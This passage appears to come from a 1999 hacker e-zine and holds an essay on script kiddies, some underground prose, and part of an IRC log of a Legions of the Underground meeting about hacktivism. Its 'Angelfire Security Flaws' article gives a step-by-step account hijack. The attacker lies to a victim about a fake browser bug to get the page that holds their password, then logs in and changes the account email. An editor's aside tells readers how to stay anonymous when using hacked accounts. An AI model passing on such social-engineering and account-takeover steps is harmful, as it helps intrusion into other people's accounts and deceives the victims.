+      around teen years, but I won't be quick to speak for all 13 yr olds. Some
+      of them may have a great understanding of Unix and all its other variations
+      and might be more l33t than yours truly. But if you've ever gotten into a 
+      fight with someone from AOL, or any other packet warrior they think there 
+      hackers and they try to mailbomb you and nuke you, icmp you, and any other
+      windows based attack. Not to say that I hate AOL, it's just some packet 
+      warrior newbies, meaning new to DoS attacks and such are usually from AOL,
+      and they started out using punters. In fact I think AOL is good for people
+      that don't have that much experience with being online and on the internet,
+      AOL provides a lovely user interface, and is definitely user friendly. Now
+      if these people ever got into Linux they would probaly be teardropping and
+      smurfing everybody but that's not the case because there to illiterate to 
+      new information. 
+      
+       The information they could find on Webpages by spending 2 to 3 hours 
+      everyday reading articles is amazing. But they choose not to. I didn't say
+      they were to dumb to learn how to use any other OS, or to learn some of the
+      flaws of a system. They just don't want to, to learn something you have to 
+      want to learn it. But when they finally, maybe, when when they r00t there 
+      first server, they usually did it by an exploit. Script kiddies aren't that
+      bad, to exploit the bug in the system you must first upload the exploit, to
+      upload something you need an account? How did they get the account? Well 
+      probaly by getting the passwd file and cracking it if it's not shadowed. 
+      This is better than having them running around IRC shoving packets down 
+      peoples throats. At least there out there learning atleast SOMETHING from
+      hacking a server. 
+      
+        I would rather have them find some other way to gain entry to a server 
+      but hey, somethings will never change. I'm truly interested too see what
+      the future of Hacking will have instore for us. 
+      
+      What did u think of this article? Drop me a line at 
+      <a href="mailto:pH4RcYd3@hotmail.com">pH4RcYd3@hotmail.com</a>      
+
+     @HWA
+     
+     
+ 3.1   Angelfire Security flaws by pH4RcYd3
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       ============================
+        Angelfire Security Flaws
+        by pH4RcYd3(@hotmail.com)
+           pDX![ pArAd0x ]
+       ----------------------------
+
+       Slightly reformatted/edited for clarity - Ed
+       
+      Introduction
+      ~~~~~~~~~~~~
+
+	Earlier in the year, I found an article on the web that eZoOns wrote
+      about hacking Angelfire. The method of social engineering and method to
+      hack Angelfire was insignificant. I offer you what I think is a better 
+      article. Remember this is for educational purposes only and I take no 
+      responsibility for what you might do with this information.
+
+      First Things First
+      ~~~~~~~~~~~~~~~~~~
+      
+	Well first you have to get the page that you get right after you login 
+      to your Angelfire account. This page is called BEDIT.HTML And a couple 
+      ines down from the <html> is their password. 
+      
+      <font color=teal>Your page 
+       <a href="http://www.angelfire.com/ak2/r00t7/index.html">
+       http://www.angelfire.com/mi/KrazieBread/index.html </a> has been saved.
+      <br>
+      You may have to click Reload or Super-Reload (Shift+Reload) to see your 
+       edited page and not your old version when you go to your URL.
+      <br>You can also announce your new page on 
+      <a href="http://homepages.whowhere.com/bin/showpage.pl?add">WhoWhere?</a>, 
+      <a href="http://newtoo.manifest.com/"><u>What's New Too!</u></a>, or if you
+       really want to get noticed, go to <a href="http://www.submit-it.com/">
+       <u>Submit It!</u></a><br>Tune up your Web Site at the 
+       <a href="http://www.angelfire.com/cgi-bin/ct?ad=websitegarage&vp=/index.
+        clicked&ru=http://www.websitegarage.com/whowhere">Web Site Garage</a>.</font>
+      </td></tr></table></center>
+      <form select method="post" action="http://www.angelfire.com/cgi-bin/bedit">
+      <input type="hidden" name="storage"  value="mi">
+      <input type="hidden" name="hpd"      value="r00t">     
+      <input type="hidden" name="password" value="r00t7">  <-------THE PASSWORD!!!
+
+     Alright so now you know where the password is, finding the username is a synch 
+     because it's in their URL. Http://www.angelfire.com/whatever/USERNAME/
+     
+      This is a dumb flaw in the Angelfire user security, yet a very dangerous one if used
+     right.Kind of lame actually.
+     
+     Moving in for the Kill
+     ~~~~~~~~~~~~~~~~~~~~~~
+	Ok first things first
+
+     1.)  Find some guy that you want to hack and tell him that you found a bug 
+          in IE 4.0 and Netscape Communicator that let's you install keyloggers 
+          and packet sniffers on their system through a perl script. 
+
+     2.)  Tell the guy you need his bedit.html page because you need some of the
+          info on there, cause if you don't have it the script won't work.
+
+     3.)  After he sends u the file get the shit you need...Login, and then from 
+          the bedit.html page click change e-mail (don't use your real one) one 
+          from Hotmail or something.
+
+     4.)  Whatever you want to do with the page is your choice, but remember..
+          be mature about it and don't do anything you'll regret later..that 
+          line sounded stupid.
+
+     Conclusion
+     ~~~~~~~~~~
+	Well I hope you've enjoyed this article. Thanx to eZoOns for discovering
+     this vulnerability in the Angelfire system. And greetz to IllumiTIE, 
+     Big Cheese, JellyNuts, Optiklenz, GodsHippy, Legion2000, HcV, HFG, and all
+     black hat hackzers!#%^
+     
+     
+     Side note;
+     ~~~~~~~~~~
+      BTW, although Hotmail is a favourite of 'hackers' make sure you all realize
+     that whatever ip you are logged in from when sending a message is INCLUDED
+     in the HEADERS of your message. Not everyone can see these if they are using
+     some shit software by a small concern called Mircosloth or Mickeysnoft or 
+     some wacked shit like that so be forewarned, HOTMAIL IS NOT ANONYMOUS and using
+     a hacked acct to send the mail can be incriminating so be careful, use a mail
+     forwarding service like netaddress and nightmail, anyone wanna do an article 
+     on anonymous mailing/receiving? - Ed
+     
+     @HWA
+     
+     
+  3.2 Some underground prose by Liquid Phire 
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      I really liked this, it grabs you by the short hairs and pulls tightly
+      read it and understand, for this is very much what it is like to be a 
+      part of the underground as a newbie and beyond. - Ed
+      
+      
+      
+      Reorder
+      (c) 1999 phiregod
+      
+      i am a hunter, searching this underground of electricity for an indiana 
+      jones-esque treasure. i plunge through the piles of bullshit, and sever 
+      the arteries of the sane. i found god, and i wasnt pleased, i found the 
+      messiah, and i wasnt saved. my very soul did i lay upon the altar, and 
+      when i lost it, i found it never was. 
+      
+      machiavellian superheros shook my hand and turned their backs. my vision 
+      was clouded by the ciggerette smoke, and my voice was hindered by a well 
+      meaning gag. i placed my hands on the planchette and found the answer 
+      that i already knew.
+      
+      on a bloody sunday, i covered my eyes as to not see the plague. i felt 
+      the refreshing rain of revolution on my burning skin and i cried. i 
+      climbed the highest mountian i could find, surmounted the greatest 
+      challange and i found not even that was enough to distract me from the 
+      pain i felt. there are too many people to save, too many to even count.
+      
+      i read every bit of weathered parchment that i coud find, i plundered 
+      the the lair of every thief in search of text that would provide 
+      redemption. i gazed into the cherubic eyes, i smiled back at the chesire 
+      grins, i found no path to follow. at this point it was obvious that i 
+      would have to cut the road myself.
+      
+      The line was busy.
+      The line was busy.
+      The line was busy.
+      The line was busy.
+      The line was busy.
+      
+      as a draw another breath through my hookah of modern voodoo an image of 
+      a brave new world floods my mind. this sarcophagus of a free medium is 
+      merely another channel to convey advertisements. the few that dare to 
+      betray what they were born for, are hunted by those that serve the 
+      institution that we call a government. this house of cards that we 
+      reside in will not protect us from the inevitable storm.
+      
+      i have joined the danse macabre, i close my eyes to avoid the light. in 
+      this year 1984 i feel forced to conform to a norm that doesnt exsist. 
+      fleeting glimpses of a better place catch my eye as i take the hand of 
+      anubis and desend into the world i belong. in these apocalyptic times it 
+      is easier to turn away then to face the fight.
+      
+      i listen to the anthems of every power crazed country, i've found 
+      occasion to sing along, looking for a cause to fight for. more people 
+      here are looking for fame and fortune, i became a god when i lost the 
+      desire to obtain what i couldnt have. i was baptized in the runoff the 
+      the information super highway, yes, it even rains in hell.
+      
+      i've shed my armor of warez, i burned the castle of manuals, and i'm 
+      trying to say what others cant put into words. i followed dante's 
+      footsteps, and i drank hamlet's wine. if i'm going to die then i have 
+      nothing left to lose. if i seek not fame or fortune, i have nothing left 
+      to win. i want every scrap of information that was ever given birth to 
+      in this maquis, i seek to become the personifacation of what no one can 
+      have.
+      
+      this is the manifesto of the product of modern life; money, comic books, 
+      games, knowledge, and sex. i'm not claiming everyone belives this, i 
+      doubt many of the few that will read it will understand in a vauge way 
+      what i am trying to say. thats not a bad thing, the more poeple that are 
+      blind, the easier it will be to slip by unnoticed. this is where i 
+      belong, a faceless name, in all the faceless names that swarm the 
+      internet.
+      
+      phiregod
+      
+      comments: liquidphire@hotmail.com
+            cc: hwa@press.usmc.net
+      
+      I took the liberty of naming this piece "reorder" the phreaks will 
+      understand this one, hope phiregod doesn't mind, keep writing and 
+      don't give up, some of us do understand ... - Ed
+      
+      
+      
+      
+      @HWA   
+     
+  4.0 The LoU irc log with comments from ex-LoU member Bronc Buster
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      I was unable to release this earlier because my source was not given permission
+      to pass this on, however things have settled somewhat and it is now "ok" to 
+      include here so here it is in its' entirety, hopefully it will shed a bit of 
+      light on the whole LoU situation or at least add to the intrigue, unabridged
+      please note that none of this information has been confirmed and the source is
+      "unknown" please remember this when reading, however it does look legit and jives
+      with what we have seen in the past regarding the LoU story, machine names of people
+      joining the chat have been REMOVED by me for obvious reasons ... 
+      
+      * NOTE * An informative message and some enlightened words follow this log 
+      (no apologies for the length we try to put out news with as little 'editing' as
+      possible..) from Bronc Buster whom has, effective two days prior to this writing
+      resigned from LoU on friendly terms. - Ed
+      
+      
+      Subject: IRC log
+      Date: Thu, 21 Jan 1999 19:36:16 +0100
+      From: "John" <ruffneck@xxxxxxx.xxx>
+      To: <cruciphux@dok.org>   
+     
+     
+     Hi!
+     
+     <snip>
+     
+     Here's the complete log of the IRC meeting of LoU and others...
+     
+     <snip>
+     
+     Session Start: Wed Jan 20 02:34:46 1999
+      * Logging #event to '#event.log'
+      [02:34] *** Now talking in #event
+      [02:38] *** Joins: kInGb0nG (~lil_b0ng@*!*.com)
+      [02:45] *** Joins: m0f0__ (synnergy@*!*.??)
+      [02:46] *** m0f0 is now known as fewer
+      [02:47] <delam> heh
+      [02:47] <m0f0_> is it fixed yet?
+      [02:48] <delam> which problem is that?
+      [02:48] <m0f0_> the bitchx one
+      [02:48] <delam> I'm compiling bitchx right now on the server
+      [02:48] *** Quits: feur (irc, where is the wizard of OZ)
+      [02:48] <m0f0_> ok, i compiled, epic, ircii, sirc.. but i don;t like them
+      all
+      [02:49] *** Quits: m0f0- (Leaving)
+      [02:49] *** Quits: fewer (Leaving)
+      [02:49] *** Quits: m0f0__ (Hey!  Where'd my controlling terminal go?)
+      [02:49] *** m0f0_ is now known as m0f0
+      [02:49] <delam> what did you find bitchx was doing or not doing?
+      [02:49] <m0f0> it says nick not registered yet
+      [02:50] <m0f0> you can join a channel, but not talk in there
+      [02:51] *** Joins: feur (~cifer@*!*.rr.com)
+      [02:51] <delam> weird
+      [02:54] <dyslexia> some people are still getting a no more connectiions i=
+      n
+      your class message
+      [02:55] <delam> that's bizzare.. lemmy check the classes 1 more time
+      [02:55] <m0f0> rehash the server?
+      [02:55] *** Joins: lothos (lothos@*!*.??)
+      [02:57] <delam> class 10 is set to 100, class 2 is set to 50 and class 1 =
+      is
+      set to 400
+      [02:58] <delam> just HUP'ed to make sure it's loaded
+      [02:58] *** Joins: cd (~gerrie@*!*.net)
+      [02:58] <m0f0> ok, let's see then
+      [03:00] <optiklenz> ok
+      [03:00] *** Joins: sdak (synnergy@*!*.net)
+      [03:00] *** Quits: sdak (BitchX by any other name is still BitchX)
+      [03:00] <m0f0> bitchx still flips here, bleh
+      [03:00] *** Joins: Kanuchsa (das@*!*.com)
+      [03:02] *** Joins: DigiEbola (digi@*!*.net)
+      [03:02] <DigiEbola> ok
+      [03:02] <DigiEbola> cant you this type?
+      [03:02] <m0f0> yeah, you dweeb
+      [03:03] * feur is away, autoaway [log:ON] [page:ON]
+      [03:03] *** Quits: Kanuchsa (: Xing)
+      [03:03] *** Joins: Winn (Winn@*!*.uu.net)
+      [03:03] *** Joins: MsIW (Beachie@*!*.uu.net)
+      [03:04] *** Parts: lothos (lothos@*!*.??)
+      [03:04] *** Joins: lothos (lothos@*!*.jp)
+      [03:05] *** lothos is now known as lothos-
+      [03:06] *** Quits: MsIW (Hey it has been fun! Thanks!!! Hugs!!! Kiss!!!)
+      [03:06] <m0f0> heh
+      [03:07] <DigiEbola> heh
+      [03:07] <Winn> What happned to MS?
+      [03:07] * m0f0 wonders
+      [03:07] <lothos-> .
+      [03:08] <DigiEbola> uggy uggy ircII
+      [03:08] <Winn> shes had dialup probs
+      [03:08] <Winn> delam - dude!
+      [03:08] <delam> hey :)
+      [03:08] *** Joins: Mark668 (~irc@*!*.pacbell.net)
+      [03:08] <feur> allright, we are waiting for some folks then we will begin=
+      ,
+      [03:08] <Winn> we're wating for a couple more.
+      [03:08] <delam> winn I think I'm outdated here heh
+      [03:08] <Winn> hehehehe... who;s the oldest here?
+      [03:09] <Mark668> 46
+      [03:09] <m0f0> woo
+      [03:09] <feur> 49
+      [03:09] <Mark668> Yo, Lou.
+      [03:09] <DigiEbola> 69 1/2
+      [03:09] *** Joins: MsIW (Beachie@*!*.uu.net)
+      [03:09] <delam> not to sound like "I remember the old days" but I did mos=
+      t
+      of my IRC in 90-91
+      [03:10] <Winn> I am not OLD!!! :-)
+      [03:10] <MsIW> Winn is old.
+      [03:10] <MsIW> :)
+      [03:10] <Winn> shut up!
+      [03:10] <MsIW> LOL!!!
+      [03:10] <Winn> 3 years and counting iw
+      [03:10] <feur> 5 minutes and counting
+      [03:10] <Winn> who are we missing?
+      [03:11] <lothos-> I'm ahhh 20.  I thought I was old...
+      [03:11] <m0f0> alot
+      [03:11] <delam> I have some old logs with the MOD/LOD wars in #hack on th=
+      e
+      original IRC server :)
+      [03:11] <optiklenz> 24 here
+      [03:11] <optiklenz> who's the oldest?
+      [03:11] <DigiEbola> im going to be 22 next month
+      [03:11] <kInGb0nG>  26
+      [03:11] <m0f0> i love to be 18
+      [03:11] * optiklenz waits patiently
+      [03:11] <Winn> i was once... when I was in r'n'r
+      [03:11] <m0f0> esp in the netherlands..
+      [03:11] <Winn> if that where you are?
+      [03:12] <m0f0> heh
+      [03:12] <dyslexia> heh
+     [03:12] <Winn> Mofo - say hi to Rene.
+      [03:12] <m0f0> hmm
+      [03:12] *** Joins: legions (~fff@*!*.net)
+      [03:12] *** legions is now known as datapleX_
+      [03:12] <datapleX_> hrm
+      [03:13] <optiklenz> legions?
+      [03:13] <optiklenz> ah
+      [03:13] <DigiEbola> hah
+      [03:13] * datapleX_ shrugs
+      [03:13] <optiklenz> basterd
+      [03:13] <m0f0> he must feel eweet
+      [03:13] <optiklenz> heh
+      [03:13] <kInGb0nG> heh
+      [03:13] <datapleX_> optik: it somehow got to mah alternative in mirc
+      [03:13] <optiklenz> ah
+      [03:13] * DigiEbola is not going say a word about windows tonight.
+      [03:13] *** datapleX_ changes topic to 'bah?'
+      [03:13] *** Quits: datapleX (Read error to
+      datapleX[tcnet06-26.sat.texas.net]: EOF from client)
+      [03:13] <optiklenz> hehe
+      [03:13] *** datapleX_ is now known as datapleX
+      [03:13] <optiklenz> i was going to say that
+      [03:13] <m0f0> bitchx, sirc don't work on this server
+      [03:14] *** Quits: lothos- (Excess Flood)
+      [03:14] <Mark668> I've not used irc much --- what's all the "heh"s mean?
+      [03:14] <delam> hahah japan? :)
+      [03:14] <m0f0> like, doh?
+      [03:14] <optiklenz> when someone says something funny
+      [03:14] <optiklenz> you say heh
+      [03:14] <Mark668> Thanks.
+      [03:14] <DigiEbola> mark: its the digital equivelent to a laugh
+      [03:14] <DigiEbola> heh
+      [03:14] <m0f0> heh
+      [03:14] <DigiEbola> try it
+      [03:14] <DigiEbola> =3D)
+      [03:14] <Mark668> Heheheheheheheh
+      [03:14] <m0f0> aww
+      [03:15] <DigiEbola> THERE YA GO!
+      [03:15] <m0f0> we made him laugh
+      [03:15] *** Joins: maquis (~me@*!*.internic.net)
+      [03:15] * optiklenz claps
+      [03:15] <Mark668> That felt virtually good
+      [03:15] <delam> MuahahahaHAHAHAHaHAHaHA
+      [03:15] <maquis> ahhhh
+      [03:15] <delam> :)
+      [03:15] <m0f0> lol
+      [03:15] <optiklenz> grand job
+      [03:15] <MsIW> welcome maquis
+      [03:15] <maquis> hello all
+      [03:15] <dyslexia> now thats an evil laugh
+      [03:15] <DigiEbola> bwahahaha
+      [03:15] <optiklenz> welcome out of the sockets of being a "heh" virgin
+      [03:15] <maquis> <DEVIOUS CACKLE HERE>
+      [03:15] <Mark668> What time do we start?
+      [03:15] <datapleX>  when is the meeting officialing beginning?
+      [03:15] <maquis> I was told 2100 ET
+      [03:15] <optiklenz> I'm not even sure of what this whole things about
+      [03:15] <m0f0> 15 mins ago
+      [03:16] <Winn> <HEH> should trigger Shockwave
+      [03:16] <optiklenz> so again my curiousity is getting the best of me
+      [03:16] <Mark668> Yep.
+      [03:16] *** Joins: lothos (lothos@*!*.net)
+      [03:16] <Mark668> Back in a minute ... I need another glass of wine.
+      [03:16] <Winn> red I hope
+      [03:16] <DigiEbola> curiosity killed the cat, so whylome wont
+      [03:16] <m0f0> hmm, let do some weed then also
+      [03:16] <delam> John Lee used to be the most annoying bastard in IRC back=
+      in
+      1991 with his substitution program
+      [03:16] *** Joins: Father (Agrosso@*!*.att.net)
+      [03:17] <Winn> welcome father!
+      [03:17] <maquis> <-- genuflects
+      [03:17] <delam> forgive me father for I have sinned
+      [03:17] <Winn> damn right
+      [03:17] <delam> heh
+      [03:18] <DigiEbola> father, yes son, i wanna kill you.....
+      [03:18] <delam> winn I don't think these guys even know our episodes
+      [03:18] * MsIW bows to the higher power
+      [03:18] <m0f0> zZZzz
+      [03:18] <datapleX> digi: I am thinking of an orbital song right now...
+      [03:18] <datapleX> ;)
+      [03:18] <m0f0> i'm thinking of my girl
+      [03:18] <DigiEbola> data: ah youngone
+      [03:18] <m0f0> she's wild
+      [03:19] <DigiEbola> m0f0: does she do things, real fast and then real slo=
+      w?
+      [03:19] <m0f0> heh
+      [03:19] <m0f0> you moron
+      [03:19] <DigiEbola> hahaha
+      [03:19] <m0f0> Digi: what about your gaymate?
+      [03:20] <DigiEbola> m0f0: myself more like it
+      [03:20] <feur> let's begin, as others will join
+      [03:20] *** Joins: pent (dschwarz@*!*.net)
+      [03:20] <DigiEbola> m0f0: it really is a problem, when i argue with
+      myself....
+      [03:20] <lothos> let's start
+      [03:20] <maquis> start away
+      [03:21] <Winn> feur - you set the stage please
+      [03:21] <datapleX> WOW...what a great start that was :)
+      [03:21] <MsIW> I agree lothos
+      [03:21] <maquis> ...the drum roll please.....
+      [03:21] <lothos> thanks Ms. IW
+      [03:21] <feur> i understand there is an attorney amongst us
+      [03:22] <Winn> That would be father
+      [03:22] <datapleX> maybe we could start w/ an introduction so that we can
+      establish who is who?
+      [03:22] <optiklenz> that'd be nice
+      [03:22] <Father> Who goes first?
+      [03:22] <m0f0> why are we here?
+      [03:23] <Winn> I am Winn Schwartau, Infowar.Com - no handle. :-)
+      [03:23] <lothos> I am Lothos. :-)
+      [03:23] <Winn> that helps! :)
+      [03:23] <lothos> RootFest organizer, member of LoU
+      [03:23] <optiklenz> I'm Steve Stakton www.legions.org
+      [03:23] <optiklenz> you guys know the handle
+      [03:23] <optiklenz> =3D]
+      [03:23] <m0f0> I am m0f0, now from africa
+      [03:23] <lothos> www.rootfest.org
+      [03:23] <maquis> I am Maquis (Rick) work at Internic...friend of INFOWAR.=
+      COM
+      [03:23] <datapleX> heh
+      [03:23] <delam> I am the Evil Dr. Delam, 2600 writer.. cover of spring 19=
+      96
+      :), phrack, empire times, etc, writer of the first keystroke capture prog=
+      ram
+      DEPL.. etc etc
+      [03:23] <dyslexia> i am dyslexia, currently residing underneath you all
+      [03:24] <DigiEbola> I am Digital Ebola , LoU member, Senior Editor of Kee=
+      n
+      Veracity
+      [03:24] <datapleX> uhm...I would be someone no one knows, or really cares=
+      to
+      know
+      [03:24] <lothos> i THOUGHT I'd be in 2600, but the new issue came out and=
+      I
+      guess not...
+      [03:24] <lothos> heh
+      [03:24] <kInGb0nG> kingb0ng, software developer, LoU member
+      [03:24] <maquis> is the new ish out yet, then?? havent seen it anywhere
+      [03:24] <MsIW> I suggest that Winn or Feur begin this gig
+      [03:24] <datapleX> feur: who are you?
+      [03:24] <feur> i am just an old man who futz's with infosec
+      [03:24] <datapleX> k
+      [03:24] <datapleX> ...go ahead
+      [03:25] <Winn> OK. A couple years back, some hackers decided to declare w=
+      ar
+      on France. They wanted CNN to watch and asked me to help.
+      [03:25] * optiklenz slips on his foot warmer
+      [03:25] <Winn> I advised them that would be a bad idea and finally with t=
+      he
+      help of some understanding feds talked them out of it.
+      [03:25] <Winn> So, I guess, we are interested in where the current
+      activities are taking us. Comments?
+      [03:25] <optiklenz> ok
+      [03:26] <Winn> So, recently, as I heard it, LoU chose China and Iraq as
+      targets. Is that right?
+      [03:26] <optiklenz> first I'd like to clear up some misconceptions brough=
+      t
+      about by some bad press
+      [03:26] <Winn> Thank you!!
+      [03:26] <maquis> most of it's bad press.
+     
+      [03:26] <optiklenz> ok
+      [03:27] -pent:#event- betty, come to elite.net for a sec please
+      [03:27] <optiklenz> The press for so long has been so occupied with makin=
+      g
+      news they are not concentrating on reporting the news
+      [03:27] <optiklenz> LoU is devised of members who enjoy all aspects of
+      computing and hold strong ethics
+      [03:28] <optiklenz> A few of the members decided to speak out against the
+      current human rights issue as it is in china
+      [03:28] -pent:#event- he wanted me to call barry person collect, but i
+      chickened out
+      [03:28] -pent:#event- thats the last i saw of him
+      [03:28] <optiklenz> the actions they decided to make was that of those
+      members, and those members alone at that moment, and time LoU was not
+      interested in anything they were doing although our support was there
+      [03:29] -pent:#event- why is the talking screwed up ?
+      [03:29] <optiklenz> Most of the members have high paying network jobs so =
+      no
+      one really had the time
+      [03:29] -pent:#event- : idle     : 2 hours 30 mins 56 secs (signon: Tue J=
+      an
+      19 18:11:19 1999)
+      [03:29] -pent:#event- he fell asleep
+      [03:30] <m0f0> someone kill pent?
+      [03:30] <datapleX> pent: please quit using notices
+      [03:30] <datapleX> who here is a federal agent of some kind?
+      [03:30] <lothos> not me!
+      [03:30] <optiklenz> We never said we were going to "destroy" anything
+      [03:30] <maquis> not me
+      [03:30] <Winn> none I know of
+      [03:31] <lothos> I was told there would be an fbi agent of some sort here.
+      [03:31] <optiklenz> all though by word of mouth, and the press putting in
+      their two cents it was stated that it was our goal to totally shutdown th=
+      ese
+      other countries
+      [03:31] <feur> there is currently none on, if one comes on, we will
+      immediately notify the channel
+      [03:31] <optiklenz> That sounds like something out of a sci-fi flick
+      [03:31] <datapleX> was one invited?
+      [03:31] <Winn> What "manifesto" so-to-speak created the impression of
+      infrastructure targeting?
+     [03:31] <MsIW> major lag  back in a minute
+      [03:31] <feur> yes, two were
+      [03:32] <optiklenz> none of them
+      [03:32] <optiklenz> our primary goal was the bring awareness
+      [03:32] <optiklenz> nothing more nothing less
+      [03:32] <MsIW> yes dataplex.  one was invited
+      [03:32] *** Quits: MsIW (Hey it has been fun! Thanks!!! Hugs!!! Kiss!!!=0F=
+      )
+      [03:32] <delam> was it the press that got screwed up or did someone pose =
+      as
+      a member and say this stuff?
+      [03:32] <Winn> Human rights in China... and Iraq?
+      [03:32] <lothos> one was? or two?
+      [03:33] <lothos> mosthated posed as a member for some press release
+      [03:33] *** Joins: MsInfoWar (Beachie@*!*.uu.net)
+      [03:33] <lothos> nationalpost.com or something
+      [03:33] <Winn> and he claimed.....?
+      [03:33] <optiklenz> we brought about the fundamental freedoms bequeathed =
+      to
+      us by the Constitution
+      [03:33] <optiklenz> freedoms that the people we spoke for only wished the=
+      y
+      had
+      [03:33] <lothos> something like LoU were terrorists
+      [03:34] <delam> how do you guys relate to mosthated?
+      [03:34] <optiklenz> we dont
+      [03:34] <optiklenz> I dont even know the guy
+      [03:34] <Winn> that's the spin I heard... how many were in on that 'spin'
+      versus a HR action.
+      [03:34] <optiklenz> none of the members did until he pulled that stunt wi=
+      th
+      the national post
+      [03:34] <feur> optik, did you notify national post
+      [03:34] <optiklenz> you mean the dismanteling of chinese firewalls?
+      [03:34] <optiklenz> I notified no one
+      [03:35] <Winn> If it
+      [03:35] <optiklenz> As far as i was concerned this matter was not that of
+      the press
+      [03:35] <optiklenz> and never should of been
+      [03:35] <feur> notify national post of mosthated's non-affiliation
+      [03:35] <optiklenz> Im not sure if any of the members did
+      [03:35] <Winn> If it's awareness, then did anyone consider an EDT-like
+      action?
+      [03:35] <optiklenz> but I will most definitly look into that
+      [03:36] <optiklenz> I posted a second rebuttal.  It explains a lot if you=
+      'd
+      take the time to read it
+      [03:36] <optiklenz> www.legions.org/reb2.txt
+      [03:36] <Winn> OPTIK: URL?
+      [03:36] <Winn> sorry...
+      [03:36] <optiklenz> members of LoU have met up with 2600, L0pht and other
+      people to clear things up
+      [03:37] <optiklenz> infact just a few weeks ago bronc was at dinner with
+      emmanuel and issac from the 2600 staff setting things straight
+      [03:37] <feur> winn, to get with the program, we got together to help LOU=
+      ,
+      not pimp them
+      [03:37] <optiklenz> Things were posted and said that were totally false
+      [03:38] <delam> have you guys been taking any heat from other hackers or
+      from anyone else?
+      [03:38] <optiklenz> no
+      [03:38] <feur> optik, are you under any guidance from counsel now
+      [03:39] <m0f0> only in lame greetings
+      [03:39] <optiklenz> the only thing I fear is some chinese loyalist knocki=
+      ng
+      at my door ready to spike my head into the punch bowl
+      [03:39] <DigiEbola> my fears exactly
+      [03:39] <lothos> the only heat we've gotten that I know about is the
+      cDc/2600/l0pht rebuttal
+      [03:39] <optiklenz> If you guys have the time check out http://pseudo.com
+      they host a show called parse
+      [03:40] <feur> optik, are you under any guidance from counsel now
+      [03:40] <optiklenz> no
+      [03:40] <optiklenz> Im just trying to get things back to normal
+      [03:40] <feur> is anyone in legions represented by counsel
+      [03:40] <optiklenz> as in?
+      [03:40] <optiklenz> a lawyer of some sort?
+      [03:40] <feur> yes
+      [03:40] <optiklenz> lawyers are for criminals
+      [03:41] <lothos> not I.
+      [03:41] <optiklenz> and we have commited no crime
+      [03:41] <DigiEbola> not I. I actually have no lawyer
+      [03:41] <dyslexia> nor i
+      [03:41] <feur> and also buffers for fearful apparitions
+      [03:41] <lothos> I agree with optik, lawyers are for criminals. :-)
+      [03:41] <optiklenz> We'd like to set things straight
+      [03:42] <optiklenz> with you, with the "hacking" community, with federal
+      angencies whomever
+      [03:42] <delam> I'd bet that after the press you probably have some feds
+      curious
+      [03:42] <m0f0> they already are
+      [03:42] <Father> Hmmm.  Are lawyers for criminals, or for people whom oth=
+      er
+      people claim are criminals?
+      [03:42] <delam> how do you know?
+      [03:42] <lothos> I got almost 50 .mil and .gov hits to rootfest.org in th=
+      e
+      past four days
+      [03:42] <dyslexia> delam, both wired and the national post have quotes fr=
+      om
+      feds
+      [03:42] <Winn> OPT: Your posting says a polish grp did stuff you got blam=
+      ed
+      for. What happened?
+      [03:42] <maquis> from what i've seen the feds have no clue...they're prol=
+      ly
+      the LAST thing to worry about....
+      [03:43] <lothos> thats good to know, maquis
+      [03:43] <m0f0> maybe to find us, or to get prove? curious they are
+      [03:43] <optiklenz> Winn> a polish group got the wrong idea and basically
+      went out attacking chinese sites saying they were doing it for our effory=
+      t
+      [03:43] <DigiEbola> I am more worried about .cn, then feds at this time
+      [03:43] <optiklenz> effort rather
+     [03:43] <datapleX> maquis: what does internic have to do with this(if you
+      are representing them at this meeting that is)?
+      [03:43] <maquis> < - not representing internic....mearly logged in from
+      there. :)
+      [03:43] <lothos> i think he said he was with infowar...
+      [03:44] <maquis> < - friend of infowar.com
+      [03:44] <feur> maquis, they probably have high interest due interfere in
+      geopolitical theater
+      [03:44] <datapleX> oh
+      [03:44] <delam> that's a cool place to log in from, can I have an account=
+      ?
+      :)
+      [03:44] <maquis> yeah, right....:)
+      [03:44] <m0f0> yeah, hook us up
+      [03:44] <optiklenz> www.pseudo.com/links/playlast.asp?archtype=3Dvid&show=
+      id=3D21
+      [03:44] <delam> never hurts to ask :)
+      [03:44] <maquis> har. i can arrange tours though.... :)
+      [03:44] <optiklenz> thats the last parse episode if anyone wants to check=
+      it
+      out
+      [03:44] <delam> cool!
+      [03:45] <DigiEbola> ill remember that when im in the area hehee
+      [03:45] <optiklenz> bronc went on and represented the legions team basica=
+      lly
+      just setting the record straight and telling everyone the real deal
+      [03:45] <DigiEbola> "whats this button do!? ewpzie"
+      [03:45] <Winn> Does your URL rep the real deal? Is this the current
+      position?
+      [03:45] <DigiEbola> bronc did a fine job of representation
+      [03:45] <optiklenz> yes
+      [03:45] <optiklenz> actually if everyone wants
+      [03:45] <optiklenz> play the url i just posted
+      [03:46] <optiklenz> set the buffer to about 25
+      [03:46] <optiklenz> Thats about when bronc starts talking
+      [03:46] <feur> optik, when all this broke, were you in violation of
+      probation
+      [03:46] <optiklenz> No
+      [03:46] <optiklenz> I went to texas for awhile to stay with a friend
+      [03:47] <optiklenz> to get away from the media, and well everything else
+      that could happen if worst came to worst
+      [03:47] <MsInfoWar> was bronc invited to come tonight?
+      [03:47] <datapleX> is mark awake?
+      [03:47] <optiklenz> Bronc was but he declined
+      [03:47] <optiklenz> he was unsure of what to make of tonights get togethe=
+      r
+      but i will relay everything him
+      [03:47] <optiklenz> to him
+      [03:47] <feur> how members have been contacted by us and other country
+      intelligence or law enforcement agencies
+      [03:47] <Winn> I met up with the EDT this weekend and they want to contin=
+      ue
+      strong HR and political actions. Do you want to continue to speak out?
+      [03:48] <lothos> question. who/what is EDT?
+      [03:48] <optiklenz> We do as long as everyone understands that we are not
+      criminals
+      [03:48] <Winn> Electronic Disruption Theater
+      [03:48] <Winn> They are on line activists
+      [03:48] <datapleX> HR =3D ?
+      [03:49] <optiklenz> and we are merely speaking on what we beleive to be
+      amended
+      [03:49] <lothos> I am NOT a criminal.  I'll say that now.
+      [03:49] <optiklenz> data>human rights
+      [03:49] <datapleX> k
+      [03:49] <Winn> To them it's an Art Form to protest.
+      [03:49] <Father> I think that's what RTM & Eugene AlterNIC said.
+      [03:49] <delam> scary
+      [03:49] <DigiEbola> I do not want us to go down as criminals or martyrs
+      [03:50] <optiklenz> Winn> our foremost intent as of right now is to get
